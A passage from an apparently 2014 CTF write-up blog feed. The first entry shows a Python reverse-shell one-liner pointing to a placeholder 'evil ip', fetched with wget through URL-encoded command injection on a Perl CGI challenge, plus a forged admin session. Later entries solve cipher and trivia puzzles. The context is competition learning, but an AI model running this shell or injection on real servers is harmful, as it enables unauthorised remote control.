</span><span class='line'>    <span class="nv">$h3</span> <span class="o">=</span> <span class="nv">$ENV</span><span class="p">{</span><span class="s">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">};</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nb">length</span><span class="p">(</span><span class="nv">$h3</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="nv">$h3</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">elsif</span> <span class="p">(</span><span class="nb">length</span><span class="p">(</span><span class="nv">$h2</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="nv">$h2</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="nv">$h1</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="s">&quot;UNKNOWN&quot;</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">sub </span><span class="nf">safestr</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">my</span> <span class="nv">$str</span> <span class="o">=</span> <span class="nb">shift</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$str</span> <span class="o">=~</span>  <span class="sr">s/([;&lt;&gt;\*\|`&amp;\$!#\(\)\[\]\{\}:&#39;&quot;])/\\$1/g</span><span class="p">;;</span>
</span><span class='line'>    <span class="k">return</span> <span class="nv">$str</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>helped us too much for filtering our ideas specialty these codes</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="nv">$SESSDIR</span> <span class="o">=</span> <span class="s">&quot;/tmp/&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$sessfile</span> <span class="o">=</span> <span class="nv">$cgi</span><span class="o">-&gt;</span><span class="n">cookie</span><span class="p">(</span><span class="s">&quot;diagsess&quot;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>we found that our sessions created in /tmp/ourcookie and ourcookie was it : md5(admin or guest||| our ip) , we tried to make a session file and we could make it and became member
and executed command by admin access but nothing happend :(
after these ways we tried to spawn shell from server of challange and we could</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">os</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;evil ip&quot;</span><span class="p">,</span><span class="n">evil</span> <span class="n">port</span><span class="p">));</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span> <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span> <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="s">&quot;-i&quot;</span><span class="p">]);</span>
</span></code></pre></td></tr></table></div></figure>


<p>we uploaded this code on a server and WGET it on challange server and then ran it ( with %0a and %20 and urlencode we colud wget it and ran it )
challange server coonected to our evil server and we could run read_key for reading flag :)</p>

<p>flag was :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="n">HITCON</span><span class="p">{</span><span class="n">a755be06b165ed8fc4710d3544fce942</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HITCON Pneumotoulthami....]]></title>
    <link href="http://h3x5p34k.github.io/blog/2014/08/27/hitcon-Trivia%2080/"/>
    <updated>2014-08-27T11:17:48+04:30</updated>
    <id>http://h3x5p34k.github.io/blog/2014/08/27/hitcon-Trivia 80</id>
    <content type="html"><![CDATA[<p>Pneumotoulthamicrescopicfilicoloaganiconissis was another Trivia challange in HITCON ctf with 80 points .</p>

<p>gave us a big text file <a href="http://bit.ly/XRnRWi">http://bit.ly/XRnRWi</a> , searching title of challange in google i found this name &ldquo;Pneumonoultramicroscopicsilicovolcanoconiosis&rdquo;</p>

<!--more-->


<p>it scientific name of a disease but title and original name had differences if you find them it wolud be &ldquo;the flag&rdquo; but just &ldquo;the flag&rdquo; , we knew that flag should have HITCON{}
then admins revealed a description :</p>

<blockquote><p>diff the file content and the origin english word (try to find it out)</p></blockquote>

<p>with this clue i googled strings of text file in google and found original text , it was name of Titin chemcial substance , now we should just copmare original and moderated
texts character by character
with python we can read strings and push them to 2D list using zip() and compare them</p>

<p>Our Code :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="n">mod</span> <span class="o">=</span> <span class="s">&#39;moderated titin name&#39;</span>
</span><span class='line'><span class="n">orig</span> <span class="o">=</span> <span class="s">&#39;original titin name&#39;</span>
</span><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span><span class="n">orig</span><span class="p">):</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">x</span> <span class="o">!=</span> <span class="n">y</span><span class="p">:</span>
</span><span class='line'>        <span class="n">res</span> <span class="o">+=</span> <span class="n">x</span>
</span><span class='line'><span class="k">print</span> <span class="n">res</span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://up.ashiyane.org/images/m4gyi584z244s20esqiw.png" title="HITCON triv2" alt="alt text" /></p>

<p>The flag is :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="n">HITCON</span><span class="p">{</span><span class="n">This</span> <span class="n">flag</span> <span class="n">is</span> <span class="n">longestestestestestestestestestestestestestestestestestestestestestestestestestest</span><span class="o">!!!</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[APAIUT-CERT Frequency Writeup]]></title>
    <link href="http://h3x5p34k.github.io/blog/2014/08/26/apaiut-cert-frequency-writeup/"/>
    <updated>2014-08-26T22:26:54+04:30</updated>
    <id>http://h3x5p34k.github.io/blog/2014/08/26/apaiut-cert-frequency-writeup</id>
    <content type="html"><![CDATA[<p>Frequency had 30 points in APAIUT-CERT CTF .</p>

<p>the cipher was :</p>

<p>QV KZGXBWOZIXPG, I KIMAIZ KQXPMZ, ITAW SVWEV IA KIMAIZ&#8217;A KQXPMZ, BPM APQNB KQXPMZ, KIMAIZ&#8217;A KWLM WZ KIMAIZ APQNB,</p>

<!--more-->


<p>QA WVM WN BPM AQUXTMAB IVL UWAB EQLMTG SVWEV MVKZGXBQWV BMKPVQYCMA. QB QA I BGXM WN ACJABQBCBQWV KQXPMZ QV EPQKP
MIKP TMBBMZ QV BPM XTIQVBMFB QA ZMXTIKML JG I TMBBMZ AWUM NQFML VCUJMZ WN XWAQBQWVA LWEV BPM ITXPIJMB. NWZ MFIUXTM,
EQBP I TMNB APQNB WN 3, L EWCTL JM ZMXTIKML JG I, M EWCTL JMKWUM J, IVL AW WV. BPM UMBPWL QA VIUML INBMZ RCTQCA KIMAIZ,
EPW CAML QB QV PQA XZQDIBM KWZZMAXWVLMVKM. NTIO: BP1AEIAMIAG</p>

<p>without any analyzing we can understand from name of challange it&rsquo;s something between Vignere , Caesar , Autokey
Autokey is substitution cipher wich had a key for changing place of each Character and also we can solve it as Cryptogram and Puzzle with Code breakers
so i used SCB Solver or you can use this online script named quipquip at <a href="http://www.quipqiup.com/">http://www.quipqiup.com/</a> for this Cipher</p>

<p>secret key:
IJKLMNOPQRSTUVWXYZABCDEFGH (means the changes of alphabet order in english)</p>

<p>decoded message:</p>

<p>in cryptography, a caesar cipher, also known as caesar&rsquo;s cipher, the shift cipher, caesar&rsquo;s code or caesar shift,
is one of the simplest and most widely known encryption techniques. it is a type of substitution cipher in which
each letter in the plaintext is replaced by a letter some fixed number of positions down the alphabet. for example,
with a left shift of 3, d would be replaced by a, e would become b, and so on. the method is named after julius caesar,
who used it in his private correspondence. flag: th1swaseasy</p>

<p>at the end of decoded cipher you can find the flag :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="n">th1swaseasy</span>
</span></code></pre></td></tr></table></div></figure>


<p>30 points ;)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HITCON 2014 Tarmful Writeup]]></title>
    <link href="http://h3x5p34k.github.io/blog/2014/08/26/hitcon-2014-tarmful-writeup/"/>
    <updated>2014-08-26T15:34:21+04:30</updated>
    <id>http://h3x5p34k.github.io/blog/2014/08/26/hitcon-2014-tarmful-writeup</id>
    <content type="html"><![CDATA[<p>Hi</p>

<p>Tarmful was a Trivia Challange in HITCON CTF 2014 with 128 points .</p>

<p>they gave file with name : tarmful-3f13b82f7794de783adfd6fa9928ad2c.zip <!--more-->
including 1024.zip and 1024 including 1023 and blah blah
but we had problem after numbers we reached file with different names such as Solve.exe .</p>

<p>Cause i had lot of free time decided to extract files by myself :) about 10 minutes spent to find the flag :D</p>

<p>Flag was :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="n">HITCON</span><span class="p">{</span><span class="n">SO0O0OO_MaNy_7Ar_Le</span><span class="o">\/</span><span class="n">eLs</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[APAIUT-CERT Helen Writeup]]></title>
    <link href="http://h3x5p34k.github.io/blog/2014/08/26/apaiut-cert-helen-writeup/"/>
    <updated>2014-08-26T14:04:23+04:30</updated>
    <id>http://h3x5p34k.github.io/blog/2014/08/26/apaiut-cert-helen-writeup</id>
    <content type="html"><![CDATA[<p>Helen was first crypto challange in APAIUT-CERT CTF which had 20 points .</p>

<p>challange was a text file including lot of dot&rsquo;s.</p>

<p><img src="http://up.ashiyane.org/images/q93k07y0pztru7m558p.png" title="crypto 1" alt="alt text" /></p>

<!--more-->


<p>First i tested with Notepad++ from View > Show Characters > All Characters and found lot of dot&rsquo;s with higher level something like Morse Code .</p>

<p>but i couldnt decode it with Morse then i tried PigPen and Mason cipher but couldnt achive anything again.</p>

<p>third and last way was Braille of Blind people , found dictionary in google an tried to decode it</p>

<p>This Link : <a href="http://www.euroblind.org/resources/braille-converter/">http://www.euroblind.org/resources/braille-converter/</a></p>

<p>Flag Was :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="n">bra1l1sfun</span>
</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[APAIUT-CERT Colors Writeup]]></title>
    <link href="http://h3x5p34k.github.io/blog/2014/08/25/apaiut-cert-colors-write-up/"/>
    <updated>2014-08-25T20:33:17+04:30</updated>
    <id>http://h3x5p34k.github.io/blog/2014/08/25/apaiut-cert-colors-write-up</id>
    <content type="html"><![CDATA[<p>Hi</p>

<p>&ldquo;colors&rdquo; was third crypto challange in APAIUT-CERT CTF which had 40 points .
they gave us this file with 11 circles .</p>

<p><img src="http://up.ashiyane.org/images/29g2rhia2m2dt8jq83mr.png" title="crypto 3" alt="alt text" /></p>

<!--more-->


<p>I had nothing in my mind till CTF admins gave a hint</p>

<blockquote><p>Look at colors codes.</p></blockquote>

<p>then i tried to extract color codes with Photoshop or GIMP
our codes had lot of Zero&rsquo;s
trying to find a way to decode that codes they gave another hints</p>

<blockquote><p>Remove Extra Zero&rsquo;s.</p></blockquote>

<p>finally it was our codes</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="mi">63</span> <span class="mi">84</span> <span class="mi">189</span> <span class="mi">238</span> <span class="mi">45</span> <span class="mi">112</span> <span class="mi">175</span> <span class="mi">140</span> <span class="mi">56</span> <span class="mi">189</span> <span class="mi">98</span>
</span></code></pre></td></tr></table></div></figure>


<p>you can use this code to extract color codes too :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">Image</span>
</span><span class='line'><span class="n">im</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s">&#39;chall.png&#39;</span><span class="p">)</span>
</span><span class='line'><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="n">w</span><span class="p">)</span> <span class="o">=</span> <span class="n">im</span><span class="o">.</span><span class="n">size</span>
</span><span class='line'><span class="n">code</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'><span class="k">def</span> <span class="nf">unique</span><span class="p">(</span> <span class="n">seq</span> <span class="p">):</span>
</span><span class='line'>    <span class="n">seen</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">seq</span><span class="p">:</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">item</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">seen</span><span class="p">:</span>
</span><span class='line'>            <span class="n">seen</span><span class="o">.</span><span class="n">add</span><span class="p">(</span> <span class="n">item</span> <span class="p">)</span>
</span><span class='line'>            <span class="k">yield</span> <span class="n">item</span>
</span><span class='line'><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">h</span><span class="p">):</span>
</span><span class='line'> <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">w</span><span class="p">):</span>
</span><span class='line'>  <span class="n">rgb_im</span> <span class="o">=</span> <span class="n">im</span><span class="o">.</span><span class="n">convert</span><span class="p">(</span><span class="s">&#39;RGB&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">r</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="n">rgb_im</span><span class="o">.</span><span class="n">getpixel</span><span class="p">((</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">))</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="n">g</span><span class="p">,</span><span class="n">b</span><span class="p">)</span> <span class="o">!=</span> <span class="p">(</span><span class="mi">255</span><span class="p">,</span><span class="mi">255</span><span class="p">,</span><span class="mi">255</span><span class="p">)</span> <span class="ow">and</span> <span class="n">r</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">g</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">b</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">:</span>
</span><span class='line'>   <span class="k">if</span> <span class="n">r</span> <span class="o">!=</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">g</span> <span class="o">!=</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">b</span> <span class="o">!=</span> <span class="mi">0</span>  <span class="p">:</span>
</span><span class='line'>    <span class="n">fin</span> <span class="o">=</span> <span class="n">r</span> <span class="ow">or</span> <span class="n">g</span> <span class="ow">or</span> <span class="n">b</span>
</span><span class='line'>    <span class="n">code</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">fin</span><span class="p">))</span>
</span><span class='line'><span class="n">code</span><span class="p">[:]</span> <span class="o">=</span> <span class="n">unique</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">code</span>
</span></code></pre></td></tr></table></div></figure>


<p>i tested ascii-table , Hex , Decimal , and &hellip;. or decodeing these codes but nothing changed because these codes had&#8217;nt special base aand Radix.</p>

<p>i went to mathematics :) so decided to find Greatest common divisor of all numbers
first 2 by 2 tested each number till 45 no divisor found with other numbers but other numbers had divisor , then deleted 45 and test for divisor of all numbers to gether
the result was &ldquo;7&rdquo; &hellip;</p>

<p>divided all numbers to 7 except 45
this was the result</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="mi">9</span> <span class="mi">12</span> <span class="mi">24</span> <span class="mi">34</span> <span class="p">?</span> <span class="mi">16</span> <span class="mi">25</span> <span class="mi">20</span> <span class="mi">8</span> <span class="mi">24</span> <span class="mi">14</span>
</span></code></pre></td></tr></table></div></figure>


<p>these numbers had a base and radix between 0-36
after testing lot of classic ciphers i found Letter Number cipher
but with a small diffrence letter number is a-z similar to 0-27
but our codes were like this a-z+0-9 similar to 1-26+27-36
in perl language it is like this :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="nv">@char</span><span class="p">{(</span><span class="s">&quot;a&quot;</span><span class="o">..</span><span class="s">&quot;z&quot;</span><span class="p">)}</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="o">..</span><span class="mi">26</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="nv">@num</span><span class="p">{(</span><span class="s">&quot;0&quot;</span><span class="o">..</span><span class="s">&quot;9&quot;</span><span class="p">)}</span> <span class="o">=</span> <span class="p">(</span><span class="mi">27</span><span class="o">..</span><span class="mi">36</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>With admin hints :) we could find the flag, i cant remember exactly but it should be the flag</p>

<p>The flag was :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="n">il073pyth0n</span>
</span></code></pre></td></tr></table></div></figure>


<p>  Cheers &lt;3</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Starting Write-ups]]></title>
    <link href="http://h3x5p34k.github.io/blog/2014/08/25/starting-write-ups/"/>
    <updated>2014-08-25T18:08:01+04:30</updated>
    <id>http://h3x5p34k.github.io/blog/2014/08/25/starting-write-ups</id>
    <content type="html"><![CDATA[<p>Hello all,</p>

<p>Everything just goes fine and We are here to break things down, wish you enjoy the write-ups.
Let us know if you have any question.</p>

<p>Have a good day,</p>

<p>h3x5p34k</p>
]]></content>
  </entry>
  
</feed>
